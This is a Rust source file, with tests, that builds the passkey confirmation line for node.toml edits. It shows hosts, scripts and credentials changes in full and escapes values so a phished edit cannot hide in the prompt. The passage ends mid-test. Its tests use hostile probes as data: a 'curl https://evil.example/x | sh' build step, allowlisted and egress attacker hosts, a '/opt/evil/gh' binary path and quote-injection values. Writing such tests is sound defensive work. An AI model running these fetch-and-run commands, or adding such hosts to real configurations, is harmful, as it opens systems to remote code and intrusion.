//! The line a passkey prompt shows for a change to `node.toml`.
//!
//! The prompt is the last thing between a phished confirmation and a write,
//! so it is built to be read by someone who did not make the request: what
//! could change what the node runs, trusts, reads, sends or reaches comes
//! first, with its value in full, quoted: a list shows the elements it
//! gains and loses, a single value what it was and what it becomes. A change
//! too large to show that way has its scripts' long steps (`build`,
//! `prepare`, `checks`) cut short, visibly, each with its length, and each
//! such list followed by how many elements and characters it holds and its
//! digest; a build's steps are long, and a list replaced whole cannot be
//! split. Nothing else is ever cut: a host, path or single value too large
//! to show is refused, to be split.
//! Routine keys follow, as many as fit, and how many more. An entry of an
//! array of tables is named by its own `path`, `name` or `id` as it was
//! before the edit, never by an index alone, and its changed fields are
//! listed; an entry under a key the node does not read is named by its
//! index only, since its fields are not shown.

use sha2::{Digest, Sha256};

use crate::config::edit::{Change, Seg};
use crate::config_schema::{self, KEYS};

use super::passkey::{hidden, MAX_SUMMARY};

const HEAD: &str = "Change node.toml: ";
/// The longest a map entry's own name (`providers.<name>`,
/// `github.dispatch.<owner/name>`) is shown.
const MAX_WILD: usize = 24;
/// The longest any other key segment is shown.
const MAX_SEGMENT: usize = 48;
/// What a long element of a list is cut to, widest first, when the edit
/// does not fit its prompt with every element whole.
const CUTS: [usize; 4] = [160, 80, 40, 20];

/// The only keys whose list elements may be cut short: scripts, long by
/// nature and replaced whole. Hosts, paths, programs and names are always
/// shown whole, so a long script in the same edit cannot push one out of
/// sight; an edit too large to show them whole is refused, to be split.
const CUTTABLE: &[&str] = &["repo.build", "repo.prepare", "repo.checks"];

/// `fit` for a change at `key`: whole unless `key` is [`CUTTABLE`].
fn fit_for(key: &[&str], fit: Fit) -> Fit {
    match CUTTABLE.iter().any(|p| pattern_covers(p, key)) {
        true => fit,
        false => Fit::Whole,
    }
}

/// How the elements of a list are shown: whole, or each string longer than
/// so many characters cut short.
#[derive(Clone, Copy)]
enum Fit {
    Whole,
    Cut(usize),
}

/// Keys whose change could widen what the node runs, trusts, reads, sends
/// or reaches, beyond what the schema flags itself (programs, host paths,
/// secrets, host-only keys). A pattern names a table or a key, `*` a map
/// entry; a table covers everything under it.
const SENSITIVE: &[&str] = &[
    "auth",
    "mesh",
    "runtime",
    "consulta",
    "boundary",
    "gateway.allow_hosts",
    "gateway.harness_listen",
    "providers.*.upstream",
    "providers.*.credential",
    "providers.*.login",
    "repo.prepare",
    "repo.prepare_credentials",
    "repo.session_egress",
    "repo.egress",
    "repo.dockerfile",
    "repo.context",
    "repo.build",
    "repo.image",
    "repo.checks",
    "service.command",
    "supervision.checks",
    "embed.base_url",
    "embed.api_key_file",
    "embed.provider",
    "github.dispatch",
    "repo.path",
    "service.name",
    "docs.preview_url",
    "docs.preview_listen",
    // Opens a listener, as `gateway.harness_listen` does.
    "metrics.listen",
    "docs.export_channel",
    "harness",
    "external.enabled",
    "session.default_channel",
    "notify.contact",
    "embed.enabled",
    "publish.commits",
    "repo.commits",
    "gateway.forward_port",
    "placement",
    // Where sessions run, and the listener and address sandboxes reach the
    // node by.
    "digitalocean",
];

fn pattern_covers(pattern: &str, key: &[&str]) -> bool {
    let parts: Vec<&str> = pattern.split('.').collect();
    parts.len() <= key.len() && parts.iter().zip(key).all(|(p, k)| *p == "*" || p == k)
}

fn spec_sensitive(spec: &config_schema::KeySpec) -> bool {
    spec.exec_path || spec.fs_path || spec.path.is_some() || spec.secret || spec.host_only
}

/// Whether a change at `key` (table segments) is one the prompt must show
/// in full: the schema flags it, the list above names it or a table above
/// it, it is a table holding such a key, or it is a key the node does not
/// read.
pub fn sensitive(key: &[&str]) -> bool {
    if !config_schema::known(key) {
        return true;
    }
    if SENSITIVE.iter().any(|p| pattern_covers(p, key)) {
        return true;
    }
    let depth = key.len();
    KEYS.iter()
        .filter(|spec| {
            let parts: Vec<&str> = spec.key.split('.').collect();
            parts.len() >= depth && parts.iter().zip(key).all(|(p, k)| *p == "*" || p == k)
        })
        .any(|spec| {
            let parts: Vec<&str> = spec.key.split('.').collect();
            spec_sensitive(spec) || SENSITIVE.iter().any(|p| pattern_covers(p, &parts))
        })
}

/// `text` with every character a prompt could not show written as an
/// escape (`\n`, `\t`, `\r`, `\u{200b}`), and `"` and `\` escaped, so
/// what is shown is what would be written, character for character.
fn visible(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    for c in text.chars() {
        match c {
            '\\' => out.push_str("\\\\"),
            '"' => out.push_str("\\\""),
            '\n' => out.push_str("\\n"),
            '\t' => out.push_str("\\t"),
            '\r' => out.push_str("\\r"),
            c if hidden(c) => out.push_str(&format!("\\u{{{:x}}}", c as u32)),
            c => out.push(c),
        }
    }
    out
}

/// [`visible`], capped at `max` characters, visibly.
fn cut(text: &str, max: usize) -> String {
    let shown = visible(text);
    match shown.chars().count() > max {
        true => format!("{}...", shown.chars().take(max).collect::<String>()),
        false => shown,
    }
}

/// A key path as the prompt shows it: each map entry's name and each
/// segment capped, every one cleaned, and each entry of an array of tables
/// named by its own name where `docs` (the file before and after) has one.
fn show_key(segs: &[Seg], docs: Option<(&toml::Table, &toml::Table)>) -> String {
    let names: Vec<&str> = segs
        .iter()
        .filter_map(|s| match s {
            Seg::Key(k) => Some(k.as_str()),
            Seg::Index(_) => None,
        })
        .collect();
    let spec = config_schema::lookup(&names);
    let pattern: Vec<&str> = spec.key.split('.').collect();
    let mut out = String::new();
    let mut n = 0;
    for (i, seg) in segs.iter().enumerate() {
        match seg {
            Seg::Index(index) => {
                out.push_str(&format!("[{index}]"));
                // As it was, so a change of its identity is shown as one.
                let entry = docs.filter(|_| config_schema::known(&names[..n])).and_then(
                    |(before, after)| {
                        at(before, &segs[..=i])
                            .or_else(|| at(after, &segs[..=i]))
                            .and_then(toml::Value::as_table)
                            .and_then(entry_name)
                    },
                );
                if let Some(name) = entry {
                    out.push_str(&format!(" ({name})"));
                }
            }
            Seg::Key(k) => {
                let wild = pattern.get(n).is_some_and(|p| *p == "*");
                let max = if wild { MAX_WILD } else { MAX_SEGMENT };
                if !out.is_empty() {
                    out.push('.');
                }
                let shown = cut(k, max);
                if !shown.is_empty()
                    && shown
                        .chars()
                        .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-')
                {
                    out.push_str(&shown);
                } else {
                    out.push_str(&format!("\"{shown}\""));
                }
                n += 1;
            }
        }
    }
    out
}

/// `text` in double quotes, cleaned, with `"` and `\` escaped, so nothing
/// inside a value can pass for the prompt's own punctuation.
pub(crate) fn quote(text: &str) -> String {
    format!("\"{}\"", visible(text))
}

/// A value: a string quoted and whole, a list element by element, each as
/// `fit` shows it.
fn render(value: &toml::Value, fit: Fit) -> String {
    match value {
        // A URL sent in the clear says so.
        toml::Value::String(s)
            if s.get(..7)
                .is_some_and(|p| p.eq_ignore_ascii_case("http://")) =>
        {
            format!("{} (cleartext)", quote(s))
        }
        toml::Value::String(s) => quote(s),
        toml::Value::Array(items) => format!(
            "[{}]",
            items
                .iter()
                .map(|v| element(v, fit))
                .collect::<Vec<_>>()
                .join(", ")
        ),
        toml::Value::Table(table) => format!(
            "{{{}}}",
            table
                .iter()
                .map(|(k, v)| format!("{} = {}", quote(k), render(v, Fit::Whole)))
                .collect::<Vec<_>>()
                .join(", ")
        ),
        other => visible(&other.to_string()),
    }
}

/// Whether `fit` cuts `value` short as an element of a list.
fn too_long(value: &toml::Value, fit: Fit) -> bool {
    match (value, fit) {
        (toml::Value::String(s), Fit::Cut(max)) => visible(s).chars().count() > max,
        _ => false,
    }
}

/// An element of a list: whole, or a string cut short, visibly, with its
/// length. Only a list's own strings are cut; anything nested is whole.
fn element(value: &toml::Value, fit: Fit) -> String {
    match (value, fit) {
        (toml::Value::String(s), Fit::Cut(max)) if too_long(value, fit) => {
            let clear = s
                .get(..7)
                .is_some_and(|p| p.eq_ignore_ascii_case("http://"));
            format!(
                "\"{}\" ({} chars){}",
                cut(s, max),
                s.chars().count(),
                if clear { " (cleartext)" } else { "" }
            )
        }
        _ => render(value, Fit::Whole),
    }
}

/// What a list some of whose elements were cut short holds: how many
/// elements and characters, and the start of the SHA-256 of the list as
/// compact JSON, so the whole can be checked against what was sent.
fn whole(list: &[toml::Value]) -> String {
    let chars: usize = list
        .iter()
        .map(|v| match v {
            toml::Value::String(s) => s.chars().count(),
            other => other.to_string().chars().count(),
        })
        .sum();
    let json = serde_json::to_string(list).unwrap_or_default();
    let digest = hex::encode(Sha256::digest(json.as_bytes()));
    format!(
        " ({} items, {chars} chars, sha256 {})",
        list.len(),
        &digest[..12]
    )
}

/// [`whole`], for `value` when it is a list `fit` cuts short, and nothing
/// otherwise.
fn whole_if_cut(value: &toml::Value, fit: Fit) -> String {
    match value {
        toml::Value::Array(list) if list.iter().any(|v| too_long(v, fit)) => whole(list),
        _ => String::new(),
    }
}

/// A sensitive key's change, shown after its key: a list's added and
/// removed elements, a value's old and new, or that it went, each element as
/// `fit` shows it. A secret's value, and a value under a key the node does
/// not read, is not shown.
fn show_change(
    at: &[&str],
    was: Option<&toml::Value>,
    now: Option<&toml::Value>,
    fit: Fit,
) -> String {
    let concealed = config_schema::lookup(at).secret || !config_schema::known(at);
    let fit = fit_for(at, fit);
    match (was, now) {
        (_, None) => " removed".into(),
        (_, Some(_)) if concealed => " = (a new value, not shown)".into(),
        (Some(toml::Value::Array(old)), Some(toml::Value::Array(new)))
            if !old.iter().chain(new).any(toml::Value::is_table) =>
        {
            let (gained, lost) = (beyond(new, old), beyond(old, new));
            let mut parts: Vec<String> = gained
                .iter()
                .map(|v| format!("+ {}", element(v, fit)))
                .collect();
            parts.extend(lost.iter().map(|v| format!("- {}", element(v, fit))));
            let tail = match gained.iter().chain(&lost).any(|v| too_long(v, fit)) {
                true => whole(new),
                false => String::new(),
            };
            match parts.is_empty() {
                true => " reordered".into(),
                false => format!(": {}{tail}", parts.join(", ")),
            }
        }
        (Some(old), Some(new)) => format!(
            ": {} -> {}{}",
            render(old, fit),
            render(new, fit),
            whole_if_cut(new, fit)
        ),
        (None, Some(new)) => format!(" = {}{}", render(new, fit), whole_if_cut(new, fit)),
    }
}

/// The elements of `list` that `other` does not account for, counted as a
/// multiset: a second copy of an element `other` holds once is one more.
fn beyond<'a>(list: &'a [toml::Value], other: &[toml::Value]) -> Vec<&'a toml::Value> {
    let mut unmatched: Vec<&toml::Value> = other.iter().collect();
    list.iter()
        .filter(|v| match unmatched.iter().position(|o| o == v) {
            Some(i) => {
                unmatched.swap_remove(i);
                false
            }
            None => true,
        })
        .collect()
}

/// What names an entry of an array of tables, for the operator.
fn entry_name(entry: &toml::Table) -> Option<String> {
    ["path", "name", "id"]
        .iter()
        .find_map(|k| entry.get(*k).and_then(toml::Value::as_str))
        .map(quote)
}

fn tables(value: Option<&toml::Value>) -> Option<Vec<&toml::Table>> {
    match value {
        None => Some(Vec::new()),
        Some(toml::Value::Array(items)) => items.iter().map(toml::Value::as_table).collect(),
        Some(_) => None,
    }
}

/// The value at `segs` in `doc`.
fn at<'a>(doc: &'a toml::Table, segs: &[Seg]) -> Option<&'a toml::Value> {
    let mut here: Option<&toml::Value> = None;
    for seg in segs {
        here = match (here, seg) {
            (None, Seg::Key(k)) => doc.get(k),
            (Some(toml::Value::Table(t)), Seg::Key(k)) => t.get(k),
            (Some(toml::Value::Array(a)), Seg::Index(i)) => a.get(*i),
            _ => return None,
        };
        here?;
    }
    here
}

struct Item {
    sensitive: bool,
    text: String,
}

/// One field of an entry, as the prompt lists it: with its change in full
/// when it is sensitive.
fn field(
    array: &[&str],
    key: &str,
    was: Option<&toml::Value>,
    now: Option<&toml::Value>,
    fit: Fit,
) -> (bool, String) {
    let mut full = array.to_vec();
    full.push(key);
    let sensitive = sensitive(&full);
    let shown = cut(key, MAX_SEGMENT);
    match sensitive {
        true => (
            true,
            format!("{shown}{}", show_change(&full, was, now, fit)),
        ),
        false => (false, shown),
    }
}

/// An array of tables that gained, lost or reordered entries, entry by
/// entry: each added or changed entry by its name with its fields, each
/// removed one by its name.
fn array_items(
    key: &[Seg],
    before: &[&toml::Table],
    after: &[&toml::Table],
    fit: Fit,
    out: &mut Vec<Item>,
) {
    let names: Vec<&str> = key
        .iter()
        .filter_map(|s| match s {
            Seg::Key(k) => Some(k.as_str()),
            Seg::Index(_) => None,
        })
        .collect();
    let shown = show_key(key, None);
    // Under a key the node does not read, an entry's fields are not shown,
    // so neither is what it would be named by.
    let known = config_schema::known(&names);
    let name_of = |entry: &toml::Table| entry_name(entry).filter(|_| known);
    let mut listed = false;
    for (i, now) in after.iter().enumerate() {
        if before.contains(now) {
            continue;
        }
        let name = name_of(now).unwrap_or_else(|| format!("#{i}"));
        let was = before
            .iter()
            .find(|b| name_of(b).is_some() && name_of(b) == name_of(now));
        let mut fields: Vec<(bool, String)> = Vec::new();
        let mut keys: Vec<&String> = now.keys().collect();
        if let Some(was) = was {
            keys.extend(was.keys().filter(|k| !now.contains_key(*k)));
        }
        for k in keys {
            let value = now.get(k);
            if was.is_some_and(|w| w.get(k) == value) {
                continue;
            }
            if was.is_none()
                && name_of(now).is_some()
                && ["path", "name", "id"].contains(&k.as_str())
            {
                continue;
            }
            fields.push(field(&names, k, was.and_then(|w| w.get(k)), value, fit));
        }
        // Sensitive fields first, as everywhere.
        fields.sort_by_key(|(s, _)| !*s);
        let sensitive = fields.iter().any(|(s, _)| *s);
        let verb = if was.is_some() { "changed" } else { "added" };
        let list = fields
            .into_iter()
            .map(|(_, t)| t)
            .collect::<Vec<_>>()
            .join(", ");
        let text = match list.is_empty() {
            true => format!("{shown} {name} {verb}"),
            false => format!("{shown} {name} {verb}: {list}"),
        };
        out.push(Item { sensitive, text });
        listed = true;
    }
    for (i, was) in before.iter().enumerate() {
        if after.contains(was) {
            continue;
        }
        let name = name_of(was);
        if name.is_some() && after.iter().any(|a| name_of(a) == name) {
            continue;
        }
        out.push(Item {
            sensitive: false,
            text: format!(
                "{shown} {} removed",
                name.unwrap_or_else(|| format!("#{i}"))
            ),
        });
        listed = true;
    }
    if !listed {
        out.push(Item {
            sensitive: false,
            text: format!("{shown} reordered"),
        });
    }
}

/// The prompt for `changes`, made against the file as it was (`before`) and
/// as it would be (`after`). `Err` when the sensitive part alone does not
/// fit a prompt even with its lists' long elements cut short: such an edit
/// is to be split.
/// `effective` (the file before the edit as it loads, every default filled
/// in) stands for a key the file did not write, so a list the edit writes
/// for the first time shows what it adds to the default rather than the
/// whole default again.
pub fn summarize(
    before: &toml::Table,
    after: &toml::Table,
    effective: &toml::Table,
    changes: &[Change],
) -> Result<String, String> {
    summarize_within(before, after, effective, changes, MAX_SUMMARY)
}

/// [`summarize`], in `budget` characters rather than a whole prompt's: what
/// is left of one once a prefix (`On <peer>: `) has taken its share, so the
/// two together are what the prompt shows and the peer's statement carries,
/// never cut.
pub fn summarize_within(
    before: &toml::Table,
    after: &toml::Table,
    effective: &toml::Table,
    changes: &[Change],
    budget: usize,
) -> Result<String, String> {
    let mut needed = 0;
    for fit in std::iter::once(Fit::Whole).chain(CUTS.map(Fit::Cut)) {
        let items = items(before, after, effective, changes, fit);
        match fitted(items, budget) {
            Ok(line) => return Ok(line),
            Err(n) => needed = n,
        }
    }
    Err(format!(
        "this edit's sensitive changes need {needed} characters even with long list elements cut short, \
         more than one confirmation can show ({budget}); split it into smaller edits"
    ))
}

/// What `changes` are, item by item, sensitive or not, lists shown as `fit`
/// says.
fn items(
    before: &toml::Table,
    after: &toml::Table,
    effective: &toml::Table,
    changes: &[Change],
    fit: Fit,
) -> Vec<Item> {
    let mut items = Vec::new();
    for change in changes {
        let segs = &change.key.0;
        let names: Vec<&str> = change.key.schema_key();
        if let (Some(was), Some(now)) = (
            tables(change.before.as_ref()),
            tables(change.after.as_ref()),
        ) {
            if !(was.is_empty() && now.is_empty()) {
                array_items(segs, &was, &now, fit, &mut items);
                continue;
            }
        }
        // A key inside an entry: named by its entry.
        let shown = show_key(segs, Some((before, after)));
        let is_sensitive = sensitive(&names);
        let text = match is_sensitive {
            true => {
                let was = change.before.as_ref().or_else(|| match change.after {
                    Some(_) => at(effective, segs),
                    None => None,
                });
                let note = match (change.before.is_none(), was.is_some()) {
                    (true, true) => " (from the default)",
                    _ => "",
                };
                format!(
                    "{shown}{}{note}",
                    show_change(&names, was, change.after.as_ref(), fit)
                )
            }
            false => shown,
        };
        items.push(Item {
            sensitive: is_sensitive,
            text,
        });
    }

    // A built-in provider the file did not name until now is replaced whole
    // by what the file says, whatever key the edit set under it.
    let named = |doc: &toml::Table| -> std::collections::BTreeSet<String> {
        doc.get("providers")
            .and_then(toml::Value::as_table)
            .map(|t| t.keys().cloned().collect())
            .unwrap_or_default()
    };
    let built_in = crate::config::default_providers();
    for name in named(after).difference(&named(before)) {
        if built_in.contains_key(name) {
            let key = show_key(
                &[Seg::Key("providers".into()), Seg::Key(name.clone())],
                None,
            );
            items.insert(
                0,
                Item {
                    sensitive: true,
                    text: format!("creates {key} (replaces the built-in provider)"),
                },
            );
        }
    }

    items
}

/// The line for `items` in `budget` characters: every sensitive item, then
/// as many routine ones as fit and how many more. `Err` with the length
/// the sensitive part needs when it does not fit.
fn fitted(items: Vec<Item>, budget: usize) -> Result<String, usize> {
    let (loud, quiet): (Vec<Item>, Vec<Item>) = items.into_iter().partition(|i| i.sensitive);
    let mut line = HEAD.to_string();
    line.push_str(
        &loud
            .iter()
            .map(|i| i.text.as_str())
            .collect::<Vec<_>>()
            .join("; "),
    );
    // Room for "and N more" is kept: the count is never what is cut.
    let reserve = match quiet.is_empty() {
        true => 0,
        false => "; ".len() + format!(" and {} more", quiet.len()).len(),
    };
    if line.chars().count() + reserve > budget {
        return Err(line.chars().count() + reserve);
    }
    let mut shown = 0;
    for (n, item) in quiet.iter().enumerate() {
        let sep = match (n, loud.is_empty()) {
            (0, true) => "",
            (0, false) => "; ",
            _ => ", ",
        };
        let rest = quiet.len() - n - 1;
        let tail = if rest > 0 {
            format!(" and {rest} more")
        } else {
            String::new()
        };
        if line.chars().count() + sep.len() + item.text.chars().count() + tail.chars().count()
            > budget
        {
            break;
        }
        line.push_str(sep);
        line.push_str(&item.text);
        shown += 1;
    }
    if shown < quiet.len() {
        line.push_str(&format!(" and {} more", quiet.len() - shown));
    }
    if loud.is_empty() && quiet.is_empty() {
        line.push_str("nothing");
    }
    Ok(line)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::edit::{preview, Op};
    use crate::config::KeyPath;

    fn prompt(text: &str, ops: &[Op]) -> Result<String, String> {
        let seen = preview(text, ops).unwrap();
        let before: toml::Table = toml::from_str(text).unwrap();
        let after: toml::Table = toml::from_str(&seen.text).unwrap();
        let effective = preview(text, &[])
            .ok()
            .and_then(|now| toml::Table::try_from(&now.config).ok())
            .unwrap_or_default();
        summarize(&before, &after, &effective, &seen.changes)
    }

    fn set(key: &str, value: impl Into<toml::Value>) -> Op {
        Op::set(KeyPath::parse(key).unwrap(), value)
    }

    /// A peer's prompt starts `On <peer>: `, and the rest is fitted to what
    /// is left: routine keys are counted rather than listed, and a sensitive
    /// change that does not fit is refused rather than cut.
    #[test]
    fn a_line_is_fitted_to_the_budget_a_prefix_leaves() {
        let mut ops: Vec<Op> = (0..30)
            .map(|i| {
                set(
                    &format!("providers.\"p{i:02}\".models"),
                    toml::Value::Array(vec![]),
                )
            })
            .collect();
        ops.push(set("publish.gh", "/opt/evil/gh"));
        let seen = preview("", &ops).unwrap();
        let after: toml::Table = toml::from_str(&seen.text).unwrap();
        let before = toml::Table::new();
        let effective = toml::Table::new();
        let line = summarize_within(&before, &after, &effective, &seen.changes, 160).unwrap();
        assert!(line.chars().count() <= 160, "{line}");
        assert!(line.contains("publish.gh"), "{line}");
        assert!(line.contains("/opt/evil/gh"), "{line}");
        assert!(line.ends_with("more"), "{line}");
        assert!(summarize_within(&before, &after, &effective, &seen.changes, 30).is_err());
    }

    #[test]
    fn a_sensitive_key_comes_first_with_its_value_however_many_routine_keys_there_are() {
        let mut ops = Vec::new();
        for key in [
            "session.budget_tokens",
            "session.permission_timeout_secs",
            "review.max_diff_lines",
            "review.max_files",
        ] {
            ops.push(set(key, 5));
        }
        for i in 0..40 {
            ops.push(set(
                &format!("providers.\"p{i:02}\".models"),
                toml::Value::Array(vec![]),
            ));
        }
        ops.push(set("publish.gh", "/opt/evil/gh"));
        let line = prompt("", &ops).unwrap();
        assert!(line.chars().count() <= MAX_SUMMARY, "{line}");
        assert!(
            line.starts_with(
                "Change node.toml: publish.gh: \"gh\" -> \"/opt/evil/gh\" (from the default); "
            ),
            "{line}"
        );
        assert!(line.ends_with("more"), "{line}");
    }

    fn strings(items: &[&str]) -> toml::Value {
        toml::Value::Array(
            items
                .iter()
                .map(|s| toml::Value::String(s.to_string()))
                .collect(),
        )
    }

    /// The probes: a host appended to a long allowlist and a command at the
    /// end of a long preparation are shown, however long what is around
    /// them, as the elements the list gains.
    #[test]
    fn what_a_list_gains_is_shown_whole_however_long_the_list() {
        let hosts: Vec<String> = (0..12)
            .map(|i| format!("^registry-{i:02}\\.a-long-mirror-name\\.example\\.org$"))
            .collect();
        let refs: Vec<&str> = hosts.iter().map(String::as_str).collect();
        let mut more = refs.clone();
        more.push("evil.example");
        let file = format!("[gateway]\nallow_hosts = {}\n", strings(&refs));
        let line = prompt(&file, &[set("gateway.allow_hosts", strings(&more))]).unwrap();
        assert_eq!(
            line,
            "Change node.toml: gateway.allow_hosts: + \"evil.example\""
        );

        let steps: Vec<String> = (0..6)
            .map(|i| format!("composer install --no-interaction --prefer-dist step-{i}"))
            .collect();
        let refs: Vec<&str> = steps.iter().map(String::as_str).collect();
        let mut more = refs.clone();
        more.push("curl https://evil.example/x | sh");
        let file = format!(
            "[[repo]]\npath = \"/src/app\"\ndockerfile = \"Dockerfile\"\nprepare = {}\n",
            strings(&refs)
        );
        let line = prompt(&file, &[set("repo[0].prepare", strings(&more))]).unwrap();
        assert_eq!(
            line,
            "Change node.toml: repo[0] (\"/src/app\").prepare: + \"curl https://evil.example/x | sh\""
        );

        // A single value is never cut either: too long to show, it is refused.
        let long = format!("/opt/{}/gh", "x".repeat(700));
        let err = prompt("", &[set("publish.gh", long.as_str())]).unwrap_err();
        assert!(err.contains("split"), "{err}");
        let fits = format!("/opt/{}/gh", "x".repeat(300));
        let line = prompt("", &[set("publish.gh", fits.as_str())]).unwrap();
        assert!(line.contains(&fits), "{line}");
    }

    /// The tracon recipe's three build steps, about 900 characters together.
    const RECIPE: [&str; 3] = [
        "apt-get update && apt-get install -y --no-install-recommends build-essential pkg-config libssl-dev ca-certificates curl git jq unzip xz-utils uidmap fuse-overlayfs slirp4netns && rm -rf /var/lib/apt/lists/* && update-ca-certificates && git config --system --add safe.directory /work",
        "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y --profile minimal --default-toolchain 1.91.0 --component clippy,rustfmt && . \"$HOME/.cargo/env\" && rustup target add x86_64-unknown-linux-gnu && cargo install --locked cargo-nextest just && cargo --version && rustc --version",
        "curl -fsSL https://bun.sh/install | BUN_INSTALL=/usr/local bash -s bun-v1.3.2 && ln -sf /usr/local/bin/bun /usr/local/bin/bunx && bun --version && mkdir -p /opt/tracon/spa && cd /opt/tracon/spa && printf '{}' > package.json && bun install || true && echo bun is ready for the interface build, its type check and its tests in every session",
    ];

    /// A build list too long to show whole is shown cut short, visibly:
    /// each step's start and length, then the list's size and digest, so
    /// one confirmation moves an entry to its build steps.
    #[test]
    fn a_build_list_too_long_to_show_whole_is_shown_cut_short_with_its_digest() {
        assert!(RECIPE.iter().map(|s| s.len()).sum::<usize>() > 850);
        let file =
            "[[repo]]\npath = \"github.com/cosmicspork/tracon\"\ndockerfile = \"Dockerfile\"\n";
        let line = prompt(
            file,
            &[
                Op::remove(KeyPath::parse("repo[0].dockerfile").unwrap()),
                set("repo[0].build", strings(&RECIPE)),
            ],
        )
        .unwrap();
        assert!(line.chars().count() <= MAX_SUMMARY, "{line}");
        assert!(
            line.contains("repo[0] (\"github.com/cosmicspork/tracon\").dockerfile removed"),
            "{line}"
        );
        for step in RECIPE {
            assert!(
                line.contains(&format!("({} chars)", step.chars().count())),
                "{line}"
            );
            assert!(line.contains(&step[..16]), "{line}");
        }
        let json = serde_json::to_string(&RECIPE).unwrap();
        let digest = hex::encode(Sha256::digest(json.as_bytes()));
        let chars: usize = RECIPE.iter().map(|s| s.chars().count()).sum();
        assert!(
            line.contains(&format!(
                "(3 items, {chars} chars, sha256 {})",
                &digest[..12]
            )),
            "{line}"
        );

        // What fits whole is still shown whole, with no digest.
        let line = prompt(
            file,
            &[
                Op::remove(KeyPath::parse("repo[0].dockerfile").unwrap()),
                set("repo[0].build", strings(&["just setup"])),
            ],
        )
        .unwrap();
        assert!(line.contains("build = [\"just setup\"]"), "{line}");
        assert!(!line.contains("sha256"), "{line}");

        // A long script in the same edit never cuts a host short: hosts are
        // shown whole, and an edit too large for that is refused.
        let host = "objects.githubusercontent.com.cdn.attacker.example";
        let line = prompt(
            file,
            &[
                Op::remove(KeyPath::parse("repo[0].dockerfile").unwrap()),
                set("repo[0].build", strings(&[RECIPE, RECIPE].concat())),
                set("repo[0].egress", strings(&[host])),
            ],
        )
        .unwrap();
        assert!(line.contains(&format!("+ {}", quote(host))), "{line}");
        assert!(line.contains("(6 items, "), "{line}");
    }

    /// Moving an entry to another repository moves what it lends: named by
    /// what it was, with the old identity and the new.
    #[test]
    fn retargeting_an_entry_shows_its_old_identity_and_its_new() {
        let file = "[[repo]]\npath = \"/src/app\"\ndockerfile = \"Dockerfile\"\nprepare = [\"composer install\"]\nprepare_credentials = [\"NOVA\"]\n";
        let line = prompt(file, &[set("repo[0].path", "/src/other")]).unwrap();
        assert_eq!(
            line,
            "Change node.toml: repo[0] (\"/src/app\").path: \"/src/app\" -> \"/src/other\""
        );
        let file = "[[service]]\nname = \"db\"\nport = 5432\nbundle = \"/srv/pg/amd64\"\n";
        let line = prompt(file, &[set("service[0].name", "cache")]).unwrap();
        assert!(
            line.contains("service[0] (\"db\").name: \"db\" -> \"cache\""),
            "{line}"
        );
    }

    #[test]
    fn an_added_repository_entry_is_named_with_what_it_lends() {
        let entry: toml::Table = toml::from_str(
            "path = \"/src/app\"\ndockerfile = \"Dockerfile\"\nprepare = [\"composer install\"]\nprepare_credentials = [\"NOVA\"]\ntimeout_secs = 60\n",
        )
        .unwrap();
        let line = prompt(
            "[[repo]]\npath = \"/src/old\"\n",
            &[Op::append(KeyPath::keys(&["repo"]), entry)],
        )
        .unwrap();
        assert_eq!(
            line,
            "Change node.toml: repo \"/src/app\" added: dockerfile = \"Dockerfile\", prepare = [\"composer install\"], prepare_credentials = [\"NOVA\"], timeout_secs"
        );

        let line = prompt(
            "[[repo]]\npath = \"/src/old\"\n[[repo]]\npath = \"/src/app\"\n",
            &[Op::remove(KeyPath::parse("repo[0]").unwrap())],
        )
        .unwrap();
        assert_eq!(line, "Change node.toml: repo \"/src/old\" removed");
    }

    /// An entry under a key the node does not read is not named by its
    /// fields: they are hidden, and a name is one of them.
    #[test]
    fn an_entry_under_an_unknown_key_echoes_nothing_of_itself() {
        let file =
            "[[qa.things]]\nname = \"s3cr3t-token-value\"\n[[qa.things]]\nname = \"other\"\n";
        let line = prompt(file, &[Op::remove(KeyPath::parse("qa.things[0]").unwrap())]).unwrap();
        assert!(!line.contains("s3cr3t"), "{line}");
        let line = prompt(file, &[set("qa.things[0].name", "x")]).unwrap();
        assert!(!line.contains("s3cr3t"), "{line}");
        assert!(line.contains("not shown"), "{line}");
    }

    /// Nothing inside a key or a value can pass for the prompt's own
    /// punctuation.
    #[test]
    fn quotes_and_separators_inside_keys_and_values_are_quoted() {
        let line = prompt(
            "",
            &[set(
                "providers.\"a\\\"; publish.gh = x\".upstream",
                "https://h.example/v1\"; mesh.hub_url = \"https://ok.example",
            )],
        )
        .unwrap();
        assert_eq!(
            line,
            "Change node.toml: providers.\"a\\\"; publish.gh = x\".upstream = \"https://h.example/v1\\\"; mesh.hub_url = \\\"https://ok.example\""
        );
    }

    #[test]
    fn sensitive_keys_that_do_not_fit_are_refused_rather_than_cut() {
        let ops: Vec<Op> = (0..30)
            .map(|i| {
                set(
                    &format!("providers.\"provider-{i:02}\".upstream"),
                    "https://a-rather-long-upstream-host.example.com/v1",
                )
            })
            .collect();
        let err = prompt("", &ops).unwrap_err();
        assert!(err.contains("split"), "{err}");
        // What is too long is the line, however few keys it names.
        assert!(err.contains("characters"), "{err}");
        assert!(err.contains(&format!("({MAX_SUMMARY})")), "{err}");
    }

    #[test]
    fn a_map_entry_name_is_capped_and_cleaned() {
        let long = format!("p{}\u{202e}x", "a".repeat(80));
        let line = prompt(
            "",
            &[set(
                &format!("providers.\"{long}\".upstream"),
                "https://h.example/v1",
            )],
        )
        .unwrap();
        assert!(!line.contains('\u{202e}'), "{line}");
        assert!(
            line.contains(&format!("providers.\"p{}...\"", "a".repeat(23))),
            "{line}"
        );
        assert!(line.contains("= \"https://h.example/v1\""), "{line}");
    }

    #[test]
    fn what_is_sensitive() {
        for key in [
            &["publish", "gh"][..],
            &["auth", "public_origin"],
            &["mesh", "hub_url"],
            &["runtime", "kubernetes", "namespace"],
            &["gateway", "allow_hosts"],
            &["providers", "x", "upstream"],
            &["repo", "prepare_credentials"],
            &["repo", "path"],
            &["service", "name"],
            &["embed", "base_url"],
            &["docs", "preview_url"],
            &["docs", "preview_listen"],
            &["metrics", "listen"],
            &["docs", "export_channel"],
            &["harness", "id"],
            &["harness", "tools"],
            &["harness", "version"],
            &["external", "enabled"],
            &["session", "default_channel"],
            &["notify", "contact"],
            &["qa", "unknown"],
            &["publish"],
            &["providers", "x"],
        ] {
            assert!(sensitive(key), "{key:?}");
        }
        for key in [
            &["review", "max_files"][..],
            &["session", "budget_tokens"],
